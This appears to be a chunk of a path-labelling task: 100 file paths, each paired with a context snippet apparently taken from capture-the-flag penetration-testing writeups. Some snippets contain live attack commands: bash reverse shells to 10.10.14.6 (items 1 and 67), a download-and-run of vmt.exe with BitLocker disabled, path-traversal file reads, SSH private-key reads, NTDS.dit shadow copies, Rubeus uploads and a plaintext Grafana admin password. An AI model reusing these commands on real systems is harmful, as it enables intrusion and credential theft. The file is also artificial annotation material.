@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 11/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /clicker.htb/exports/top_players_7pbbwdqy.php
+   context: http://clicker.htb/exports/top_players_7pbbwdqy.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/443%200%3E%261%27
+2. /root/TeamCity/buildAgent/lib/kotlin-stdlib.jar
+   context: r.jar:/root/TeamCity/buildAgent/lib/ehcache-core.jar:/root/TeamCity/buildAgent/lib/common-tools.jar:/root/TeamCity/buildAgent/lib/kotlin-stdlib.jar:/root/TeamCity/buildAgent/lib/spring-context.jar:/ro
+3. /usr/share/empty.sshd
+   context: \nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony:x:994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq:x:993:
+4. C:\users\bob.wood\AppData\Roaming\Microsoft\Credentials
+   context: C:\users\bob.wood\AppData\Roaming\Microsoft\Credentials
+5. /var/www/pro-files/bulletproof.php
+   context: blogName);         system("chmod +w /var/www/microblog/" . $blogName . "/edit");         system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");         system("mkd
+6. C:\Users\M.harris\desktop
+   context: *Evil-WinRM* PS C:\Users\M.harris\desktop> type user.txt d41d8cd9************************
+7. /devvortex.htb/about.html
+   context: 573w     8884c http://devvortex.htb/contact.html 200      GET      231l      545w     7388c http://devvortex.htb/about.html 200      GET      583l     1274w    18048c http://devvortex.htb/index.html 2
+8. C:\programdata\RemotePotato0.exe
+   context: upload /opt/RemotePotato0/RemotePotato0.exe Info: Uploading /opt/RemotePotato0/RemotePotato0.exe to C:\programdata\RemotePotato0.exe                   Data: 235520 bytes of 235520 bytes copied  Info: 
+9. /usr/local/bin/excludes/windows_excludes
+   context: ric_excludes' not found 2025-08-20 11:49:32,103 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes 2025-08-20 11:49:32,103 :: ERROR :: Exclude file 'excludes/
+10. /home/deploy
+   context: /home/deploy
+11. /etc/s6
+   context: ,   "Path": "/usr/bin/entrypoint",                             "Args": [     "/bin/s6-svscan",     "/etc/s6"   ],   ...[snip]...     "Env": [       "USER_UID=115",       "USER_GID=121",       "GITEA__
+12. C:\Users\Administrator
+   context: evil-winrm-py PS C:\Users\Administrator> tree /f . Folder PATH listing Volume serial number is 00000201 E2B2:45D5 C:\USERS\ADMINISTRATOR ¦
+13. /usr/bin/ansible-galaxy
+   context: pt/playbooks/" #define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook" #define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy" #define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"  int check_auth(co
+14. /root/.ssh/id_ed25519
+   context: SELECT "0xdf) >                                                                      > /inputfile (/root/.ssh/id_ed25519) (r) file def > inputfile 1000 string readstring >
+15. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\EF2ADE3B1EFB
+   context: B3B0B2D3\C2ADC3DABD0A RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2C2BEC23A2E RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\EF2ADE3B1EFB RW C:\Windows\SYSVOL\domain\
+16. C:\Get-bADpasswords\Get-bADpasswords.ps1
+   context: Machine: HATHOR (Microsoft Windows NT 10.0.20348.0) Host Application: powershell.exe C:\Get-bADpasswords\Get-bADpasswords.ps1 Process ID: 25908                               PSVersion: 5.1.20348.643  
+17. C:\Windows\System32\com\dmp\
+   context: tion\CRMLog\*" /><FilePathCondition Path="C:\Windows\System32\com\dmp:*" /><FilePathCondition Path="C:\Windows\System32\com\dmp\*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp:*" /><FilePathC
+18. C:\Users\adam.silver
+   context: *Evil-WinRM* PS C:\Users\adam.silver> tree /f Folder PATH listing Volume serial number is 311D-593C C:. +---3D Objects +---Contacts +---
+19. /home/mark/confs/file.conf
+   context: mark@guardian:~$ sudo safeapache2ctl  Usage: safeapache2ctl -f /home/mark/confs/file.conf
+20. C:\Users\bb.morgan\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\bb.morgan\Documents>
+21. /root/license/keys
+   context: st. Please provide valid username.")         print("")         sys.exit()     existing_keys = open("/root/license/keys", "r")     all_keys = existing_keys.readlines()     for user_key in all_keys:    
+22. C:\Users\ryan\desktop
+   context: *Evil-WinRM* PS C:\Users\ryan\desktop> type user.txt ec9ef945************************
+23. /opt/SecLists/Discovery/DNS
+   context: oxdf@hacky$ ffuf -u http://10.129.237.248 -H "Host: FUZZ.guardian.htb" -w <( cat /opt/SecLists/Discovery/DNS/* | grep git | sort -u ) -ac          /'___\  /'___\           /'___\               /\ \__/
+24. C:\Windows\System32\conhost.exe
+   context: yewy\ShellExperienceHost.exe  6492  2444  conhost.exe              x64   1        HOSPITAL\drbrown  C:\Windows\System32\conhost.exe  6676  892   dllhost.exe              x64   1        HOSPITAL\drbrow
+25. /var/lib/sss
+   context: root@icinga:/var/lib/sss# find . -type f ./secrets/secrets.ldb ./db/cache_cerberus.local.ldb ./db/ccache_CERBERUS.LOCAL ./db
+26. /full/path/to/sqlite.db
+   context: al/en/package.database.mdb2.intro-dsn.php // NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646' //       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db' $con
+27. E:\Windows\ntds
+   context: evil-winrm-py PS C:\programdata> robocopy /b E:\Windows\ntds . ntds.dit  -------------------------------------------------------------------------------    ROBO
+28. /snap/firefox/3131/gnome-platform/usr/lib/gtk-2.0/modules/libcanberra-gtk-module.so
+   context: K natively. Please try to not load it.  (firefox:171499): Gtk-WARNING **: 09:58:07.130: GTK+ module /snap/firefox/3131/gnome-platform/usr/lib/gtk-2.0/modules/libcanberra-gtk-module.so cannot be loaded
+29. /opt/site.new/wp-content/plugins
+   context: www-data@moderators:/opt/site.new/wp-content/plugins$ ls brandfolder  index.php  passwords-manager
+30. /etc/grafana/provisioning
+   context: _METRICS_PAGE_LIMIT=500 HOME=/usr/share/grafana AWS_AUTH_EXTERNAL_ID= SHLVL=3 GF_PATHS_PROVISIONING=/etc/grafana/provisioning GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! GF_SECURITY_ADMIN_USER=enzo G
+31. /dev/shm/apache2.conf
+   context: admin@zero:~$ apache2ctl -d /etc/apache2/ -d /dev/shm -t apache2: Could not open configuration file /dev/shm/apache2.conf: No such file or directory Action '-d /etc/apache2/ -d /dev/shm -t' failed. Th
+32. /opt/scripts_review
+   context: james_mason@shared:/opt/scripts_review$ ls -la total 8 drwxrwx--- 2 root developer 4096 Mar 20 09:41 . drwxr-xr-x 3 root root      4096 Ma
+33. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_085
+   context: file or directory (2) [2415:2418:0309/174909.488776:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_085": No such file or director
+34. /tmp/clr-debug-pipe-815523-2926128-in
+   context: TIME, 0, NULL, FUTEX_BITSET_MATCH_ANY) = 0 futex(0x569d43619ef0, FUTEX_WAKE_PRIVATE, 1) = 0 unlink("/tmp/clr-debug-pipe-815523-2926128-in") = 0 unlink("/tmp/clr-debug-pipe-815523-2926128-out") = 0 wri
+35. /etc/sudoers.d/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+   context: aaa-aaaa-aaaaaaaaaaaa -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa             /etc/sudoers.d/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1:37: syntax error                              
+36. \\dc1.scrm.local\IPC$
+   context: net use \\dc1.scrm.local\IPC$
+37. C:\Users\svc_scan\Desktop
+   context: C:\Users\svc_scan\Desktop>type user.txt 1c9e6ed2************************
+38. C:\driver\reaper.sys
+   context: TRUE        FALSE        0                 4,096       0          7/27/2023 9:12:21 AM   \??\C:\driver\reaper.sys
+39. /var/log/apache2/error.log.2.gz
+   context: s.log.2.gz /var/log/apache2/error.log.1 /var/log/apache2/error.log /var/log/apache2/access.log.3.gz /var/log/apache2/error.log.2.gz /var/log/apache2/other_vhosts_access.log /var/log/apache2/access.log
+40. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_039
+   context: file or directory (2) [2415:2418:0309/174909.483560:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_039": No such file or director
+41. C:\Users\enox\Desktop
+   context: enox@MEDIA C:\Users\enox\Desktop>type user.txt 47a835d0************************
+42. /root/.bash_history
+   context: templates/index.html /home/app/app/templates/login.html /home/app/app/templates/register.html /root /root/.bash_history /root/.bashrc /root/.cache /root/.cache/motd.legal-displayed /root/.local /root/
+43. /root/TeamCity/buildAgent/lib/patches-impl.jar
+   context: cher-api.jar:/root/TeamCity/buildAgent/lib/nuget-utils.jar:/root/TeamCity/buildAgent/lib/common.jar:/root/TeamCity/buildAgent/lib/patches-impl.jar:/root/TeamCity/buildAgent/lib/freemarker.jar:/root/Te
+44. C:\windows\tasks\cur.inf
+   context: automatic get-service -Name MSSQLSERVER Start-Service mssqlserver whoami /all secedit /export /cfg C:\windows\tasks\cur.inf notepad C:\windows\tasks\cur.inf secedit /configure /db C:\Windows\Security\
+45. C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761
+   context: *Evil-WinRM* PS C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-21-1844305427-4058123335-2739572863-2761> ls -force      Directory: C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect\S-1-5-
+46. C:\Users\Administrator\Documents
+   context: |__/  v1.6.0  [*] Connecting to 'S200401.overwatch.htb:5985' as 'administrator' evil-winrm-py PS C:\Users\Administrator\Documents>
+47. /usr/local/bin/bee
+   context: bin\:/sbin\:/bin\:/snap/bin  User johncusack may run the following commands on dog:     (ALL : ALL) /usr/local/bin/bee
+48. /../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml
+   context: oxdf@hacky$ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/provisioning/datasources/mysql.yaml apiVersion: 1  datasources:  - na
+49. /usr/sbin/pppd
+   context: -gnu-x86_64-0.23.1/freqset /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/sbin/pppd /usr/bin/newgrp /usr/bin/mount /usr/bin/sudo /usr/bin/su /usr/bin/chfn /usr/bin/umoun
+50. /home/jeremy/docker/previous/public/examples/hello-world.ts
+   context: become │ incompatible with published releases. ╵ examples_example.example: Refreshing state... [id=/home/jeremy/docker/previous/public/examples/hello-world.ts]  No changes. Your infrastructure matches
+51. C:\Programdata\0xdf.txt
+   context: whoami /all > C:\Programdata\0xdf.txt
+52. /opt/crontabs
+   context: enzo@planning:/opt/crontabs$ ls crontab.db enzo@planning:/opt/crontabs$ file crontab.db  crontab.db: New Line Delimited JSON te
+53. C:\Users\kioskUser0
+   context: PS C:\Users\kioskUser0> tree /f . Folder PATH listing Volume serial number is 00000040 4A4B:52B4 C:\USERS\KIOSKUSER0 ├───3
+54. /home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/enumeration/memberships.py
+   context: membership_enum.enumerate_memberships(timestamp=timestamp, fileNamePrefix=fileNamePrefix)   File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/enumeration/membership
+55. /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a
+   context: 06 |     printf("offset %d\n", off);       |                    ~^     ~~~ ...[snip].. /usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_
+56. /....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+   context: ...//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 97ms] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//...
+57. C:\Users\jack.black
+   context: PS C:\Users\jack.black> tree /f Folder PATH listing Volume serial number is A9B2-0C2A C:. +---3D Objects +---Contacts +---
+58. C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx
+   context: abceasyas123' -AsPlainText -Force  PS C:\get-badpasswords> $cert = Import-PfxCertificate -FilePath 'C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx' -Password $pass -CertSt
+59. /usr/lib/apache2/modules/mod_mpm_worker.so
+   context: s/mod_mpm_* /usr/lib/apache2/modules/mod_mpm_event.so  /usr/lib/apache2/modules/mod_mpm_prefork.so  /usr/lib/apache2/modules/mod_mpm_worker.so
+60. /usr/share/grafana
+   context: AUTH_SESSION_DURATION=15m HOSTNAME=7ce659d667d7 PWD=/ AWS_AUTH_AssumeRoleEnabled=true GF_PATHS_HOME=/usr/share/grafana AWS_CW_LIST_METRICS_PAGE_LIMIT=500 HOME=/usr/share/grafana AWS_AUTH_EXTERNAL_ID= 
+61. C:\Users\GinaWild\Desktop\cert.pfx
+   context: c:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663>type $IZIX7VV.pfx ўp#C:\Users\GinaWild\Desktop\cert.pfx
+62. /proc/3718/root/tmp/busybox
+   context: jonathan@snapped:~$ file /proc/3718/root/tmp/busybox  /proc/3718/root/tmp/busybox: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically
+63. /root/TeamCity/buildAgent/lib/jackson-databind.jar
+   context: y/buildAgent/lib/cloud-shared-core.jar:/root/TeamCity/buildAgent/lib/coverage-java-agent-common.jar:/root/TeamCity/buildAgent/lib/jackson-databind.jar:/root/TeamCity/buildAgent/lib/xz.jar:/root/TeamCi
+64. /portal.guardian.htb/lecturer/notices/create.php
+   context: ncoded Content-Length: 134 Origin: http://portal.guardian.htb Connection: keep-alive Referer: http://portal.guardian.htb/lecturer/notices/create.php Cookie: PHPSESSID=7v229pqv85nqobn4rt5phtpmo9 Upgrad
+65. /usr/sbin/omv-rpc
+   context: openmediavault-webgui@derailed:/etc/openmediavault$ /usr/sbin/omv-rpc -u admin "config" "applyChanges" "{ \"modules\": [\"ssh\"], \"force\": true }" null
+66. /whiterabbit.htb/n8n.png
+   context: 17141w  1391904c http://whiterabbit.htb/uptime.png 200      GET     3683l    20644w  1621908c http://whiterabbit.htb/n8n.png 200      GET      116l      510w     6109c http://whiterabbit.htb/ [#######
+67. /portal.carpediem.htb/uploads/1669663920_0xdf.php
+   context: oxdf@hacky$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://portal.carpediem.htb/uploads/1669663920_0xdf.php
+68. /usr/share/seclists/Usernames/cirt-default-usernames.txt
+   context: oxdf@hacky$ smtp-user-enum -m VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt 10.10.11.166 25 Connecting to 10.10.11.166 25 ... 220 debian.localdomain ESMTP Postfix (Debian/GNU)
+69. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_050
+   context: file or directory (2) [2415:2418:0309/174909.483847:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_050": No such file or director
+70. \\dc.baby2.vl\docs
+   context: Set objNetwork = Nothing End Sub  MapNetworkShare "\\dc.baby2.vl\apps", "V" MapNetworkShare "\\dc.baby2.vl\docs", "L"
+71. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_022
+   context: file or directory (2) [2415:2418:0309/174909.483116:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_022": No such file or director
+72. /opt/pyinstxtractor/pyinstxtractor.py
+   context: oxdf@hacky$ python3.10 /opt/pyinstxtractor/pyinstxtractor.py modfile  [+] Processing modfile [+] Pyinstaller version: 2.1+ [+] Python version: 3.10 [+] Length o
+73. /usr/share/vhost-manage/includes
+   context: /usr/share/vhost-manage/includes
+74. C:/users/administrator/desktop/user.txt
+   context: meterpreter > cat C:/users/administrator/desktop/user.txt 386af5a6************************
+75. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\AEE0FC3CA30F
+   context: D3232FEB RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\3CFD3DD1BCFA RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\AEE0FC3CA30F RW C:\Windows\S
+76. /home/fismathack
+   context: r:/$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
+77. \\vmt.exe\r\nmanage-bde
+   context: 0.11.90:81/vmt.exe -O vmt.exe\r\niwr http://10.10.15.62:81/vmt.exe -O vmt.exe\r\n.\\vmt.exe\r\ndel .\\vmt.exe\r\nmanage-bde -off c:\\\r\ndisable-bitlocker -mountpoint c:\\\r\npowershell iwr https://ca
+78. /var/www/app/app.js
+   context: home/kai_relay/app/index.js www-data    1253  3.3  2.4 11829760 97340 ?      Ssl  Aug12  58:56 node /var/www/app/app.js www-data    1254  0.2  1.4 1032140 58356 ?       Ssl  Aug12   4:15 node /var/www
+79. /absolute.htb/js/jquery-3.3.1.min.js
+   context: 63240c http://absolute.htb/js/bootstrap.min.js 200      GET        2l     1283w    86926c http://absolute.htb/js/jquery-3.3.1.min.js 200      GET     4919l     8218w    79820c http://absolute.htb/font
+80. /root/cleanup/config.ini
+   context: command */10 * * * * cp /root/cleanup/resources.ini /etc/icingaweb2/resources.ini */10 * * * * cp /root/cleanup/config.ini /etc/icingaweb2/config.ini */10 * * * * cp /root/cleanup/roles.ini /etc/icing
+81. /home/oxdf/hackthebox/corporate-10.10.11.246/bitwarden-pin
+   context: a2 v0.10.6    Compiling hkdf v0.12.3    Compiling pbkdf2 v0.11.0    Compiling bitwarden-pin v0.1.0 (/home/oxdf/hackthebox/corporate-10.10.11.246/bitwarden-pin)     Finished `release` profile [optimize
+82. /usr/share/apache2/icons/ball.red.gif
+   context: re/apache2/icons/alert.red.gif /usr/share/apache2/icons/burst.gif /usr/share/apache2/icons/pie1.gif /usr/share/apache2/icons/ball.red.gif
+83. /root/cleanup/resources.ini
+   context: root@icinga:~# crontab -l ...[snip]... # m h  dom mon dow   command */10 * * * * cp /root/cleanup/resources.ini /etc/icingaweb2/resources.ini */10 * * * * cp /root/cleanup/config.ini /etc/icingaweb2/c
+84. /home/kai_relay/.nvm/versions/node/v20.6.0/bin/node
+   context: es-enabled$ ps auxww | grep node kai_rel+     978  0.0  1.1 1024708 44728 ?       Ssl  Aug12   0:01 /home/kai_relay/.nvm/versions/node/v20.6.0/bin/node /home/kai_relay/app/index.js www-data    1253  3
+85. /sea.htb/themes/bike/theme.php
+   context: sea.htb/themes/bike => http://sea.htb/themes/bike/ 500      GET        9l       15w      227c http://sea.htb/themes/bike/theme.php 200      GET        1l        1w        6c http://sea.htb/themes/bike
+86. c:\wapt\log
+   context: f\ca-192.168.120.158.crt  [tftpserver] root_dir = c:\wapt\waptserver\repository\wads\pxe log_path = c:\wapt\log
+87. C:\Users\enox
+   context: osoft Windows [Version 10.0.20348.4052] (c) Microsoft Corporation. All rights reserved.  enox@MEDIA C:\Users\enox>
+88. C:\Users\alaading\Documents
+   context: nP44ek1m3  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\alaading\Documents>
+89. C:\Windows\Temp\0xdf.cab
+   context: set verbose on set context persistent nowriters set metadata C:\Windows\Temp\0xdf.cab add volume c: alias 0xdf create expose %0xdf% e:
+90. /usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py
+   context: ages/neo4j/_sync/work/result.py", line 409, in _attach     self._connection.fetch_message()   File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner     func(*args
+91. /conversor.htb/static/test.txt
+   context: oxdf@hacky$ curl http://conversor.htb/static/test.txt 0xdf was here!
+92. /root/TeamCity/buildAgent/lib/coverage-java-agent-common.jar
+   context: lib/com.github.adedayo.intellij.sdk.trove4j.jar:/root/TeamCity/buildAgent/lib/cloud-shared-core.jar:/root/TeamCity/buildAgent/lib/coverage-java-agent-common.jar:/root/TeamCity/buildAgent/lib/jackson-d
+93. /etc/apparmor.d
+   context: /etc/apparmor.d
+94. \\r\ndir\r\nGet-NetConnectionProfile\r\nSet-ADAccountPassword
+   context: estart.ps1\r\nexplorer .\r\ndir ..\\Desktop\\\r\nmove ..\\Desktop\\cleanup.ps1 .\r\ndir ..\\Desktop\\\r\ndir\r\nGet-NetConnectionProfile\r\nSet-ADAccountPassword -Identity "Administrator" -NewPassword
+95. C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect
+   context: *Evil-WinRM* PS C:\Users\Bob.Wood> gci -force AppData\Roaming\Microsoft\Protect\      Directory: C:\Users\Bob.Wood\AppData\Roaming\Microsoft\Protect  Mode                 LastWriteTime         Length 
+96. /school.flight.htb/BLOG.html
+   context: 299w     2683c http://school.flight.htb/HOME.html 200      GET       45l      498w     3618c http://school.flight.htb/BLOG.html 403      GET        9l       30w      306c http://school.flight.htb/aux 
+97. /dc-jpq225.cicada.vl/certsrv/certfnsh.asp
+   context: 5.cicada.vl/' -template DomainController Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8) [*] Listening on 0.0.0.0:445 [*] Setting up SMB Ser
+98. /www.windcorp.htb/assets/vendor/swiper/swiper-bundle.min.css
+   context: http://www.windcorp.htb/assets/img/team/team-3.jpg 200      GET       13l      164w    15563c http://www.windcorp.htb/assets/vendor/swiper/swiper-bundle.min.css 403      GET        7l        9w      1
+99. C:\programdata\Rubeus.exe
+   context: ramework_4.5_x64/Rubeus.exe Info: Uploading /opt/SharpCollection/NetFramework_4.5_x64/Rubeus.exe to C:\programdata\Rubeus.exe                                                               Data: 369320
+100. /usr/share/tomcat9
+   context: sMountsFor=/var/log/tomcat9 /var/lib/tomcat9  [Service]  # Configuration Environment="CATALINA_HOME=/usr/share/tomcat9" Environment="CATALINA_BASE=/var/lib/tomcat9" Environment="CATALINA_TMPDIR=/tmp" 
